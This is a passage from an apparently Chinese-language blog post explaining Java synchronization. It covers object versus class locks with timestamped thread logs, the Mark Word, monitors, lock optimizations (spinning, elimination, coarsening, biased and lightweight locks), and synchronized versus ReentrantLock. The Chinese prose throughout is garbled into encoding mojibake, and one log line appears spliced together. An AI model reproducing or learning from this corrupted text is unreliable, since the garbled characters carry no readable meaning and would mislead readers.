10:53:46</strong></p><p>æˆ‘ä»¬åˆ†å¼€æ¥çœ‹</p><p><strong><font color="orange">A_threadæƒ³æ€ä¹ˆæ ·å°±æ€ä¹ˆæ ·ï¼Œå› ä¸ºæ˜¯å¼‚æ­¥çš„ã€‚1å¯èƒ½åäº2æ‰§è¡Œä½†æ˜¯å…ˆäº2ç»“æŸã€‚</font></strong></p><p><strong><font color="blue">B_threadåœ¨è¿›å…¥åŒæ­¥å—ä¹‹å‰å’ŒA_threadè¡Œä¸ºä¸€æ ·ï¼Œè¿›å…¥åè°å…ˆæŠ¢å é”è°å…ˆæ‰§è¡Œã€‚</font></strong></p><p><strong>C_threadå› ä¸ºä½¿ç”¨synchronizedä¿®é¥°æ–¹æ³•ï¼Œå› æ­¤ä¸€å¼€å§‹å°±æ˜¯åŒæ­¥æ–¹æ³•ã€‚</strong></p><p>ç„¶åå†åˆèµ·æ¥çœ‹ï¼š</p><p>å‘ç°çº¿ç¨‹Cå’Œçº¿ç¨‹Bä¹Ÿæ˜¯åŒæ­¥çš„ï¼Œå› ä¸ºsynchronizedçš„å˜é‡æ˜¯ä¸€æ ·çš„ã€‚</p><p>åŒæ­¥æ–¹æ³•å’ŒåŒæ­¥å—é”çš„éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚</p><p>å¦‚æœæ¢æˆä¸åŒå¯¹è±¡å‘¢ï¼Ÿ</p><p><img src="/2020/04/06/mt/image-20200406095434194.png"></p><p><font color="blue"><strong>B_thread2_SyncObjectBlock1: 11:05:52</strong></font></p><p><font color="blue"><strong>B_thread1_SyncObjectBlock1: 11:05:52</strong></font></p><p><strong>C_thread1_SyncObjectMethod1: 11:05:52</strong></p><p><strong>C_thread1_SyncObjectMethod1_Start: 11:05:52</strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_Start: 11:05:52</font></strong></p><p><strong>C_thread1_SyncObjectMethod1_End: 11:05:53</strong></p><p><strong>C_thread2_SyncObjectMethod1: 11:05:53</strong></p><p><strong>C_thread2_SyncObjectMethod1_Start: 11:05:53</strong></p><p><strong><font color="blue">B_thread2_SyncObjectBlock1_End: 11:05:53</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_Start: 11:05:53</font></strong></p><p><strong><font color="blue">B_thread1_SyncObjectBlock1_End: 11:05:54</font></strong></p><p><strong>C_thread2_SyncObjectMethod1_End: 11:05:54</strong></p><p>æ˜æ˜¾çœ‹åˆ°å’Œä¸Šé¢æœ€å¤§çš„å·®åˆ«å°±æ˜¯Bå’ŒCå˜æˆå¼‚æ­¥çš„äº†ã€‚</p><p><img src="/2020/04/06/mt/image-20200406095626317.png"></p><p><strong><font color="blue">D_thread2_SyncClassBlock1: 11:17:10</font></strong></p><p><strong><font color="orange">A_thread1_Async_Start: 11:17:10</font></strong></p><p><strong><font color="blue">D_thread1_SyncClassBlock1: 11:17:10</font></strong></p><p><strong>E_thread1_SyncClassMethod1: 11:17:10</strong></p><p><strong><font color="orange">A_thread2_Async_Start: 11:17:10</font></strong></p><p><strong>E_thread1_SyncClassMethod1_Start: 11:17:10</strong></p><p><strong><font color="orange">A_thread2_Async_End: 11:17:11</font></strong></p><p><strong>E_thread1_SyncClassMethod1_End: 11:17:11</strong></p><p><font color="orange"><strong>D_thread1_SyncClassBlock1: 11:17:10A_thread1_Async_End: 11:17:11</strong></font></p><p><strong><font color="blue">D_thread1_SyncClassBlock1_Start: 11:17:11</font></strong></p><p><strong><font color="blue">D_thread1_SyncClassBlock1_End: 11:17:12</font></strong></p><p><strong><font color="blue">D_thread2_SyncClassBlock1_Start: 11:17:12</font></strong></p><p><strong><font color="blue">D_thread2_SyncClassBlock1_End: 11:17:13</font></strong></p><p><strong>E_thread2_SyncClassMethod1: 11:17:13</strong></p><p><strong>E_thread2_SyncClassMethod1_Start: 11:17:13</strong></p><p><strong>E_thread2_SyncClassMethod1_End: 11:17:14</strong></p><p>å…¶å®å’Œç¬¬ä¸€æ¬¡çš„ç»“æœä¸€è‡´ï¼ŒåŒæ—¶æ³¨æ„ä¸€ä¸ªç»†èŠ‚å°±æ˜¯ç±»é”ä¸å¹²æ‰°å¯¹è±¡é”ã€‚</p><p><img src="/2020/04/06/mt/image-20200406095920294.png"></p><p><font color="red"><strong>ç±»é”å’Œå¯¹è±¡é”æ˜¯äº’ä¸å¹²æ‰°çš„</strong></font></p><h4><span id="å¯¹è±¡é”å’Œç±»é”çš„æ€»ç»“">å¯¹è±¡é”å’Œç±»é”çš„æ€»ç»“</span></h4><ol><li><p>æœ‰çº¿ç¨‹è®¿é—®å¯¹è±¡çš„åŒæ­¥ä»£ç å—æ—¶ï¼Œå¦å¤–çš„çº¿ç¨‹å¯ä»¥è®¿é—®è¯¥å¯¹è±¡çš„éåŒæ­¥ä»£ç å—ï¼›</p></li><li><p>è‹¥é”ä½çš„æ˜¯åŒä¸€å¯¹è±¡ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨è®¿é—®å¯¹è±¡çš„åŒæ­¥ä»£ç å—æ—¶ï¼Œå¦ä¸€ä¸ªè®¿é—®å¯¹è±¡çš„åŒæ­¥ä»£ç å—çš„çº¿ç¨‹ä¼šè¢«é˜»å¡ï¼›</p></li><li><p>è‹¥é”ä½çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨è®¿é—®å¯¹è±¡çš„åŒæ­¥æ–¹æ³•æ—¶ï¼Œå¦ä¸€ä¸ªè®¿é—®å¯¹è±¡åŒæ­¥æ–¹æ³•çš„çº¿ç¨‹ä¼šè¢«é˜»å¡ï¼›</p></li><li><p>è‹¥é”ä½çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨è®¿é—®å¯¹è±¡çš„åŒæ­¥ä»£ç å—æ—¶ï¼Œå¦ä¸€ä¸ªè®¿é—®å¯¹è±¡åŒæ­¥æ–¹æ³•çš„çº¿ç¨‹ä¼šè¢«é˜»å¡ï¼Œåä¹‹äº¦ç„¶ï¼›</p></li><li><p>åŒä¸€ä¸ªç±»çš„ä¸åŒå¯¹è±¡çš„å¯¹è±¡é”äº’ä¸å¹²æ‰°ï¼›</p></li><li><p>ç±»é”ç”±äºä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯¹è±¡é”ï¼Œå› æ­¤è¡¨ç°å’Œä¸Šè¿°1,2,3,4ä¸€è‡´ï¼Œè€Œç”±äºä¸€ä¸ªç±»åªæœ‰ä¸€æŠŠå¯¹è±¡é”ï¼Œæ‰€ä»¥<font color="orange">åŒä¸€ä¸ªç±»</font>çš„<font color="red">ä¸åŒå¯¹è±¡ä½¿ç”¨ç±»é”</font>å°†ä¼šæ˜¯åŒæ­¥çš„ï¼›</p></li><li><p>ç±»é”å’Œå¯¹è±¡é”äº’ä¸å¹²æ‰°</p></li></ol><p><strong><font color="red">ä¸€ä¸ªæ˜¯ç±»å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯å¯¹è±¡ã€‚</font></strong></p><h2><span id="å¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€">å¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€</span></h2><p>Ã˜ å¯¹è±¡å¤´</p><p>Ã˜ å®ä¾‹æ•°æ®</p><p>Ã˜ å¯¹é½å¡«å……</p><h3><span id="å¯¹è±¡å¤´çš„ç»“æ„">å¯¹è±¡å¤´çš„ç»“æ„</span></h3><p><img src="/2020/04/06/mt/image-20200406100050928.png"></p><h3><span id="mark-word">Mark Word</span></h3><p><img src="/2020/04/06/mt/image-20200406100106418.png"></p><h2><span id="monitoræ¯ä¸ªjavaå¯¹è±¡å¤©ç”Ÿè‡ªå¸¦äº†ä¸€æŠŠçœ‹ä¸è§çš„é”cå®ç°">Monitorï¼šæ¯ä¸ªJavaå¯¹è±¡å¤©ç”Ÿè‡ªå¸¦äº†ä¸€æŠŠçœ‹ä¸è§çš„é”ï¼ˆC++å®ç°ï¼‰</span></h2><p><img src="/2020/04/06/mt/image-20200406100119993.png"></p><p><img src="/2020/04/06/mt/image-20200406100127154.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒæ­¥ä»£ç å—æ‰§è¡Œçš„æ˜¯monitorenterå’ŒmonitorexitæŒ‡ä»¤</p><h2><span id="ä»€ä¹ˆæ˜¯ä»é‡å…¥">ä»€ä¹ˆæ˜¯ä»é‡å…¥</span></h2><p>ä»äº’æ–¥é”çš„è®¾è®¡ä¸Šæ¥è¯´ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è¯•å›¾æ“ä½œä¸€ä¸ªç”±å…¶ä»–çº¿ç¨‹æŒæœ‰çš„å¯¹è±¡é”çš„ä¸´ç•Œèµ„æºæ—¶ï¼Œå°†ä¼šå¤„äºé˜»å¡çŠ¶æ€ï¼Œä½†å½“ä¸€ä¸ªçº¿ç¨‹<font color="orange"><strong>å†æ¬¡è¯·æ±‚è‡ªå·±æŒæœ‰å¯¹è±¡é”çš„ä¸´ç•Œèµ„æºæ—¶</strong></font>ï¼Œè¿™ç§æƒ…å†µå±äºé‡å…¥ã€‚</p><h2><span id="ä¸ºä»€ä¹ˆä¼šå¯¹synchronizedå—¤ä¹‹ä»¥é¼»">ä¸ºä»€ä¹ˆä¼šå¯¹synchronizedå—¤ä¹‹ä»¥é¼»</span></h2><p>Ã˜ æ—©æœŸç‰ˆæœ¬ï¼Œsynchronizedå±äºé‡é‡çº§é”ï¼Œä¾èµ–äºMutex Lockå®ç°</p><p>Ã˜ çº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢éœ€è¦ä»<font color="orange">ç”¨æˆ·æ€è½¬æ¢åˆ°æ ¸å¿ƒæ€</font>ï¼Œå¼€é”€è¾ƒå¤§ã€‚</p><h2><span id="java6ä»¥åsynchronizedæ€§èƒ½å¾—åˆ°äº†å¾ˆå¤§çš„æå‡">Java6ä»¥åï¼Œsynchronizedæ€§èƒ½å¾—åˆ°äº†å¾ˆå¤§çš„æå‡</span></h2><table><thead><tr><th>Adaptive Spinning</th><th align="center">Lightweight Locking</th></tr></thead><tbody><tr><td>Lock Eliminate</td><td align="center">Biased Locking</td></tr><tr><td>Lock Coarsening</td><td align="center">â€¦</td></tr></tbody></table><h2><span id="è‡ªæ—‹é”ä¸è‡ªé€‚åº”è‡ªæ—‹é”">è‡ªæ—‹é”ä¸è‡ªé€‚åº”è‡ªæ—‹é”</span></h2><h3><span id="è‡ªæ—‹é”">è‡ªæ—‹é”</span></h3><p>Ã˜ è®¸å¤šæƒ…å†µä¸‹ï¼Œå…±äº«æ•°æ®çš„é”å®šçŠ¶æ€æŒç»­æ—¶é—´è¾ƒçŸ­ï¼Œåˆ‡æ¢çº¿ç¨‹ä¸å€¼å¾—</p><p>Ã˜ é€šè¿‡è®©çº¿ç¨‹æ‰§è¡Œå¿™å¾ªç¯ç­‰å¾…é”çš„é‡Šæ”¾ï¼Œä¸è®©å‡ºCPU</p><p>Ã˜ ç¼ºç‚¹ï¼šè‹¥é”è¢«å…¶å®ƒçº¿ç¨‹é•¿æ—¶é—´å ç”¨ï¼Œä¼šå¸¦æ¥è®¸å¤šæ€§èƒ½ä¸Šçš„å¼€é”€</p><p>jvmè°ƒä¼˜å¯ä»¥ç”¨-XX:preBlockSpin</p><h3><span id="è‡ªé€‚åº”è‡ªæ—‹é”">è‡ªé€‚åº”è‡ªæ—‹é”</span></h3><p>Ã˜ è‡ªæ—‹çš„æ¬¡æ•°ä¸å†å›ºå®š</p><p>Ã˜ ç”±å‰ä¸€æ¬¡åœ¨åŒä¸€ä¸ªé”ä¸Šçš„è‡ªæ—‹æ—¶é—´åŠé”çš„æ‹¥æœ‰è€…çš„çŠ¶æ€æ¥å†³å®š</p><h2><span id="é”æ¶ˆé™¤">é”æ¶ˆé™¤</span></h2><h3><span id="æ›´å½»åº•çš„ä¼˜åŒ–">æ›´å½»åº•çš„ä¼˜åŒ–</span></h3><p>Ã˜ JITç¼–è¯‘æ—¶ï¼Œå¯¹è¿è¡Œä¸Šä¸‹æ–‡è¿›è¡Œæ‰«æï¼Œå»é™¤ä¸å¯èƒ½å­˜åœ¨ç«äº‰çš„é”ã€‚</p><p><img src="/2020/04/06/mt/image-20200406102305792.png"></p><p>è‡ªåŠ¨æ¶ˆé™¤è¿™ä¸ªsynchronizedé”ï¼Œå› ä¸ºsbå±äºæœ¬åœ°å˜é‡å¹¶æ²¡æœ‰returnå‡ºå»ï¼Œå› æ­¤ä¸å­˜åœ¨è¢«å…¶ä»–çº¿ç¨‹å¼•ç”¨åˆ°çš„é£é™©ï¼Œå› æ­¤ä¼šè‡ªåŠ¨å–æ¶ˆsynchronized</p><p><img src="/2020/04/06/mt/image-20200406102315172.png"></p><h2><span id="é”ç²—åŒ–">é”ç²—åŒ–</span></h2><h3><span id="å¦ä¸€ç§æç«¯">å¦ä¸€ç§æç«¯</span></h3><p>é€šè¿‡æ‰©å¤§é”çš„èŒƒå›´ï¼Œé¿å…é‡å¤åŠ é”å’Œè§£é”</p><p><img src="/2020/04/06/mt/image-20200406102342630.png"></p><p>å› ä¸ºæ˜¯åœ¨å¾ªç¯å†…éƒ¨åŠ è§£é”ï¼Œè™½ç„¶å¯èƒ½å­˜åœ¨åŒæ­¥ç«äº‰ï¼Œä½†æ˜¯åœ¨çº¿ç¨‹å†…éƒ¨å…¶å®æ˜¯æ²¡æœ‰åŒæ­¥ç«äº‰çš„ï¼Œå› æ­¤JVMä¼šå°†é”åŠ åˆ°æ–¹æ³•ä¸Šï¼Œè€Œä¸æ˜¯ä¸€ä¸ªappendæ“ä½œé‡Œé¢ã€‚</p><h2><span id="synchronizedçš„å››ç§çŠ¶æ€">Synchronizedçš„å››ç§çŠ¶æ€</span></h2><p>Ã˜ æ— é”ã€åå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”</p><p><strong>é”è†¨èƒ€æ–¹å‘ï¼šæ— é”â†’åå‘é”â†’è½»é‡çº§é”â†’é‡é‡çº§é”</strong></p><h3><span id="åå‘é”å‡å°‘åŒä¸€çº¿ç¨‹è·å–é”çš„ä»£ä»·-cascompare-and-swap-">åå‘é”ï¼šå‡å°‘åŒä¸€çº¿ç¨‹è·å–é”çš„ä»£ä»· CASï¼ˆCompare and Swapï¼‰ã€-ã€‘</span></h3><p>Ã˜ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œé”ä¸å­˜åœ¨å¤šçº¿ç¨‹ç«äº‰ï¼Œæ€»æ˜¯ç”±åŒä¸€çº¿ç¨‹å¤šæ¬¡è·å¾—</p><p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong></p><p>å¦‚æœä¸€ä¸ªçº¿ç¨‹è·å¾—äº†é”ï¼Œ<font color="orange">åœ¨Mark Wordä¸­CASè®°å½•ownerï¼Œ<em>å¦‚æœæˆåŠŸã€‚</em>é‚£ä¹ˆé”å°±è¿›å…¥åå‘æ¨¡å¼ï¼Œæ­¤æ—¶Mark Wordçš„ç»“æ„ä¹Ÿå˜ä¸ºåå‘é”ç»“æ„</font>ï¼Œå½“è¯¥çº¿ç¨‹å†æ¬¡è¯·æ±‚é”æ—¶ï¼Œæ— éœ€å†åšä»»ä½•åŒæ­¥æ“ä½œï¼Œå³è·å–é”çš„è¿‡ç¨‹åªéœ€è¦<font color="orange">æ£€æŸ¥Mark Wordçš„é”æ ‡è®°ä½ä¸ºåå‘é”ä»¥åŠå½“å‰çº¿ç¨‹Idç­‰äºMark Wordçš„ThreadIDå³å¯</font>ï¼Œè¿™æ ·å°±çœå»äº†å¤§é‡æœ‰å…³é”ç”³è¯·çš„æ“ä½œã€‚</p><p>å¦‚æœæµ‹è¯•å¤±è´¥ï¼Œåˆ™éœ€è¦å†æµ‹è¯•ä¸€ä¸‹Mark Wordä¸­åå‘é”çš„æ ‡è¯†æ˜¯å¦è®¾ç½®æˆ1ï¼ˆè¡¨ç¤ºå½“å‰æ˜¯åå‘é”ï¼‰ï¼šå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™ä½¿ç”¨CASç«äº‰é”ï¼›å¦‚æœè®¾ç½®äº†ï¼Œåˆ™å°è¯•ä½¿ç”¨CASå°†å¯¹è±¡å¤´çš„åå‘é”æŒ‡å‘å½“å‰çº¿ç¨‹</p><p>ä¸é€‚ç”¨äºé”ç«äº‰æ¯”è¾ƒæ¿€çƒˆçš„å¤šçº¿ç¨‹åœºåˆ</p><h3><span id="è½»é‡çº§é”">è½»é‡çº§é”</span></h3><p>è½»é‡çº§é”æ˜¯ç”±åå‘é”å‡çº§æ¥çš„ï¼Œåå‘é”è¿è¡Œåœ¨ä¸€ä¸ªçº¿ç¨‹åŒæ­¥å—çš„æƒ…å†µä¸‹ï¼Œå½“ç¬¬äºŒä¸ªçº¿ç¨‹åŠ å…¥é”äº‰ç”¨çš„æ—¶å€™ï¼Œåå‘é”å°±ä¼šå‡çº§ä¸ºè½»é‡çº§é”ã€‚ </p><p>é€‚åº”çš„åœºæ™¯ï¼šçº¿ç¨‹<font color="orange">äº¤æ›¿æ‰§è¡Œ</font>åŒæ­¥å— </p><p>è‹¥å­˜åœ¨åŒä¸€æ—¶é—´è®¿é—®åŒä¸€é”çš„æƒ…å†µï¼Œå°±ä¼šå¯¼è‡´è½»é‡çº§é”è†¨èƒ€ä¸ºé‡é‡çº§é”</p><h4><span id="åŠ é”è¿‡ç¨‹">åŠ é”è¿‡ç¨‹</span></h4><p>ï¼ˆ1ï¼‰   åœ¨ä»£ç è¿›å…¥åŒæ­¥å—çš„æ—¶å€™ï¼Œå¦‚æœåŒæ­¥å¯¹è±¡é”çŠ¶æ€ä¸ºæ— é”çŠ¶æ€ï¼ˆé”çŠ¶æ€ä½ä¸ºâ€œ01â€çŠ¶æ€ï¼‰ï¼Œè™šæ‹Ÿæœºé¦–å…ˆå°†åœ¨å½“å‰çº¿ç¨‹çš„æ ˆå¸§ä¸­å»ºç«‹ä¸€ä¸ªåä¸ºé”è®°å½•ï¼ˆLock Recordï¼‰çš„ç©ºé—´ã€‚ç”¨äºå­˜å‚¨é”å¯¹è±¡ç›®å‰çš„Mark Wordçš„æ‹·è´ï¼Œå®˜æ–¹ç§°ä¹‹ä¸ºDisplaced Mark Wordã€‚è¿™æ—¶å€™çº¿ç¨‹å †æ ˆä¸å¯¹è±¡å¤´çš„çŠ¶æ€å¦‚å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/04/06/mt/image-20200406102559772.png">       </p><p>ï¼ˆ2ï¼‰   æ‹·è´å¯¹è±¡å¤´ä¸­çš„Mark Wordå¤åˆ¶åˆ°é”è®°å½•ä¸­ã€‚</p><p>ï¼ˆ3ï¼‰   æ‹·è´æˆåŠŸåï¼Œè™šæ‹Ÿæœºå°†ä½¿ç”¨CASæ“ä½œå°è¯•å°†å¯¹è±¡çš„Mark Wordæ›´æ–°ä¸ºæŒ‡å‘Lock Recordçš„æŒ‡é’ˆï¼Œå¹¶å°†Lock recordé‡Œçš„owneræŒ‡é’ˆæŒ‡å‘Object mark wordã€‚å¦‚æœæ›´æ–°æˆåŠŸï¼Œåˆ™æ‰§è¡Œæ­¥éª¤ï¼ˆ4ï¼‰å¦åˆ™æ‰§è¡Œæ­¥éª¤ï¼ˆ5ï¼‰ã€‚</p><p>ï¼ˆ4ï¼‰   å¦‚æœè¿™ä¸ªæ›´æ–°åŠ¨ä½œæˆåŠŸäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°±æ‹¥æœ‰äº†è¯¥å¯¹è±¡çš„é”ï¼Œå¹¶ä¸”å¯¹è±¡Mark Wordçš„é”æ ‡å¿—ä½è®¾ç½®ä¸ºâ€œ00â€ï¼Œå³è¡¨ç¤ºæ­¤å¯¹è±¡å¤„äºè½»é‡çº§é”å®šçŠ¶æ€ï¼Œè¿™æ—¶å€™çº¿ç¨‹å †æ ˆå’Œå¯¹è±¡å¤´çš„çŠ¶æ€å¦‚å›¾æ‰€ç¤ºã€‚</p><p> <img src="/2020/04/06/mt/image-20200406102622997.png"></p><p>ï¼ˆ5ï¼‰   å¦‚æœè¿™ä¸ªæ›´æ–°æ“ä½œå¤±è´¥äº†ï¼Œè™šæ‹Ÿæœºé¦–å…ˆä¼šæ£€æŸ¥å¯¹è±¡çš„Mark Wordæ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹çš„æ ˆå¸§ï¼Œå¦‚æœæ˜¯å°±è¯´æ˜å½“å‰çº¿ç¨‹å·²ç»æ‹¥æœ‰äº†è¿™ä¸ªå¯¹è±¡çš„é”ï¼Œé‚£å°±å¯ä»¥ç›´æ¥è¿›å…¥åŒæ­¥å—ç»§ç»­æ‰§è¡Œã€‚å¦åˆ™è¯´æ˜å¤šä¸ªçº¿ç¨‹ç«äº‰é”ï¼Œè½»é‡çº§é”å°±è¦è†¨èƒ€ä¸ºé‡é‡çº§é”ï¼Œé”æ ‡å¿—çš„çŠ¶æ€å€¼å˜ä¸ºâ€œ10â€ï¼ŒMark Wordä¸­å­˜å‚¨çš„å°±æ˜¯æŒ‡å‘é‡é‡çº§é”ï¼ˆäº’æ–¥é‡ï¼‰çš„æŒ‡é’ˆï¼Œåé¢ç­‰å¾…é”çš„è¿‡ç¨‹ä¹Ÿè¦è¿›å…¥é˜»å¡çŠ¶æ€ã€‚è€Œå½“å‰çº¿ç¨‹ä¾¿å°è¯•ä½¿ç”¨è‡ªæ—‹æ¥è·å–é”ï¼Œè‡ªæ—‹ä¹‹å‰è®²è¿‡ï¼Œå°±æ˜¯ä¸è®©çº¿ç¨‹é˜»å¡ï¼Œè€Œé‡‡ç”¨å¾ªç¯å»è·å–é”çš„è¿‡ç¨‹ã€‚ </p><h4><span id="è§£é”è¿‡ç¨‹">è§£é”è¿‡ç¨‹</span></h4><p>ï¼ˆ1ï¼‰   é€šè¿‡CASæ“ä½œå°è¯•æŠŠçº¿ç¨‹ä¸­å¤åˆ¶çš„Displaced Mark Wordå¯¹è±¡æ›¿æ¢å½“å‰çš„Mark Wordã€‚</p><p>ï¼ˆ2ï¼‰   å¦‚æœæ›¿æ¢æˆåŠŸï¼Œæ•´ä¸ªåŒæ­¥è¿‡ç¨‹å°±å®Œæˆäº†ã€‚</p><p>ï¼ˆ3ï¼‰   å¦‚æœæ›¿æ¢å¤±è´¥ï¼Œè¯´æ˜æœ‰å…¶ä»–çº¿ç¨‹å°è¯•è¿‡è·å–è¯¥é”ï¼ˆæ­¤æ—¶é”å·²è†¨èƒ€ï¼‰ï¼Œé‚£å°±è¦åœ¨é‡Šæ”¾é”çš„åŒæ—¶ï¼Œå”¤é†’è¢«æŒ‚èµ·çš„çº¿ç¨‹ã€‚</p><p><strong>åŠ é”</strong></p><p>çº¿ç¨‹åœ¨æ‰§è¡ŒåŒæ­¥å—ä¹‹å‰ï¼ŒJVMä¼šå…ˆåœ¨å½“å‰çº¿ç¨‹çš„æ ˆæ¡¢ä¸­<strong>åˆ›å»ºç”¨äºå­˜å‚¨é”è®°å½•çš„ç©ºé—´</strong>ï¼Œå¹¶å°†å¯¹è±¡å¤´ä¸­çš„Mark Wordå¤åˆ¶åˆ°é”è®°å½•ä¸­ï¼Œå®˜æ–¹ç§°ä¸º<strong>Displaced Mark Word</strong>ã€‚ç„¶åçº¿ç¨‹å°è¯•ä½¿ç”¨CAS<strong>å°†å¯¹è±¡å¤´ä¸­çš„Mark Wordæ›¿æ¢ä¸ºæŒ‡å‘é”è®°å½•çš„æŒ‡é’ˆ</strong>ã€‚å¦‚æœæˆåŠŸï¼Œå½“å‰çº¿ç¨‹è·å¾—é”ï¼Œå¦‚æœå¤±è´¥ï¼Œè¡¨ç¤ºå…¶ä»–çº¿ç¨‹ç«äº‰é”ï¼Œå½“å‰çº¿ç¨‹ä¾¿å°è¯•ä½¿ç”¨è‡ªæ—‹æ¥è·å–é”ã€‚</p><p><strong>è§£é”</strong></p><p>è½»é‡çº§è§£é”æ—¶ï¼Œä¼šä½¿ç”¨åŸå­çš„CASæ“ä½œå°†Displaced Mark Wordæ›¿æ¢å›åˆ°å¯¹è±¡å¤´ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ç«äº‰å‘ç”Ÿã€‚å¦‚æœå¤±è´¥ï¼Œè¡¨ç¤ºå½“å‰é”å­˜åœ¨ç«äº‰ï¼Œé”å°±ä¼šè†¨èƒ€æˆé‡é‡çº§é”ã€‚</p><h2><span id="é”çš„å†…å­˜è¯­ä¹‰">é”çš„å†…å­˜è¯­ä¹‰</span></h2><p>å½“çº¿ç¨‹é‡Šæ”¾é”æ—¶ï¼ŒJavaå†…å­˜æ¨¡å‹ä¼šæŠŠè¯¥çº¿ç¨‹å¯¹åº”çš„æœ¬åœ°å†…å­˜ä¸­çš„å…±äº«å˜é‡åˆ·æ–°åˆ°ä¸»å†…å­˜ä¸­ï¼›</p><p>è€Œå½“çº¿ç¨‹è·å–é”æ—¶ï¼ŒJavaå†…å­˜æ¨¡å‹ä¼šæŠŠè¯¥çº¿ç¨‹å¯¹åº”çš„æœ¬åœ°å†…å­˜ç½®ä¸ºæ— æ•ˆï¼Œä»è€Œä½¿å¾—è¢«ç›‘æ§å™¨ä¿æŠ¤çš„ä¸´ç•ŒåŒºä»£ç å¿…é¡»ä»ä¸»å†…å­˜ä¸­è¯»å–å…±äº«å˜é‡ã€‚</p><p><img src="/2020/04/06/mt/image-20200406102705063.png"></p><h2><span id="åå‘é”-è½»é‡çº§é”-é‡é‡çº§é”çš„æ±‡æ€»">åå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”çš„æ±‡æ€»</span></h2><p><img src="/2020/04/06/mt/image-20200406102715189.png"></p><h2><span id="synchronizedå’Œreentrantlock">Synchronizedå’ŒReentrantLock</span></h2><h3><span id="reentrantlockå†å…¥é”">ReentrantLockï¼ˆå†å…¥é”ï¼‰</span></h3><p>Ã˜ ä½äºjava.util.concurrent.locksåŒ…</p><p>Ã˜ å’ŒCountDownLatchã€FutureTaskã€Semaphoreä¸€æ ·åŸºäºAQSå®ç°</p><p>Ã˜ èƒ½å¤Ÿæ¯”synchronizedæ›´ç»†ç²’åº¦çš„æ§åˆ¶ï¼Œå¦‚æ§åˆ¶fairness</p><p>Ã˜ è°ƒç”¨lockï¼ˆï¼‰ä¹‹åï¼Œå¿…é¡»è°ƒç”¨unlockï¼ˆï¼‰é‡Šæ”¾é”</p><p>Ã˜ æ€§èƒ½æœªå¿…æ¯”synchronizedé«˜ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å¯é‡å…¥çš„</p><h4><span id="reentrantlockå…¬å¹³æ€§çš„è®¾ç½®">ReentrantLockå…¬å¹³æ€§çš„è®¾ç½®</span></h4><p>Ã˜ ReentrantLock fairLock &#x3D; new ReentrantLockï¼ˆtrueï¼‰ï¼›</p><p>Ã˜ å‚æ•°ä¸ºtrueæ—¶ï¼Œå€¾å‘äºå°†é”èµ‹äºˆç­‰å¾…æ—¶é—´æœ€ä¹…çš„çº¿ç¨‹</p><p>Ã˜ å…¬å¹³é”ï¼šè·å–é”çš„é¡ºåºæŒ‰å…ˆåè°ƒç”¨lockæ–¹æ³•çš„é¡ºåºï¼ˆæ…ç”¨ï¼‰</p><p>Ã˜ éå…¬å¹³é”ï¼šæŠ¢å é¡ºåºä¸ä¸€å®šï¼Œçœ‹è¿æ°”</p><p>Ã˜ Synchronizedæ˜¯éå…¬å¹³é”</p><p> <img src="/2020/04/06/mt/image-20200406102742724.png"></p><p><img src="/2020/04/06/mt/image-20200406102748852.png"></p><h4><span id="reentrantlockå°†é”å¯¹è±¡åŒ–">ReentrantLockå°†é”å¯¹è±¡åŒ–</span></h4><p>Ã˜ åˆ¤æ–­æ˜¯å¦æœ‰çº¿ç¨‹ï¼Œæˆ–è€…æŸä¸ªç‰¹å®šçº¿ç¨‹ï¼Œåœ¨æ’é˜Ÿç­‰å¾…è·å–é”</p><p>Ã˜ å¸¦è¶…æ—¶çš„è·å–é”çš„å°è¯•</p><p>Ã˜ æ„ŸçŸ¥æœ‰æ²¡æœ‰æˆåŠŸè·å–é”</p><h4><span id="èƒ½å°†waitnotifynotifyallå¯¹è±¡åŒ–">èƒ½å°†wait\notify\notifyAllå¯¹è±¡åŒ–</span></h4><p>Ã˜ Java.util.concurrent.locks.Condition</p><h4><span id="synchronizedå’Œreentrantlockçš„åŒºåˆ«æ€»ç»“">Synchronizedå’ŒReentrantLockçš„åŒºåˆ«æ€»ç»“</span></h4><p>Ã˜ Synchronizedæ˜¯å…³é”®å­—ï¼ŒReentrantLockæ˜¯ç±»</p><p>Ã˜ ReentrantLockå¯ä»¥å¯¹è·å–é”çš„ç­‰å¾…æ—¶é—´è¿›è¡Œè®¾ç½®ï¼Œé¿å…æ­»é”</p><p>Ã˜ ReetrantLockå¯ä»¥è·å–å„ç§é”çš„ä¿¡æ¯</p><p>Ã˜ ReentrantLockå¯ä»¥çµæ´»åœ°å®ç°å¤šè·¯é€šçŸ¥</p><p>Ã˜ <font color="red">æœºåˆ¶ï¼šsyncæ“ä½œMark Wordï¼Œlockè°ƒç”¨Unsafeç±»çš„parkï¼ˆï¼‰æ–¹æ³•</font></p><h2><span id="ä»€ä¹ˆæ˜¯javaå†…å­˜æ¨¡å‹ä¸­çš„happens-before">ä»€ä¹ˆæ˜¯Javaå†…å­˜æ¨¡å‹ä¸­çš„happens-before</span></h2><h3><span 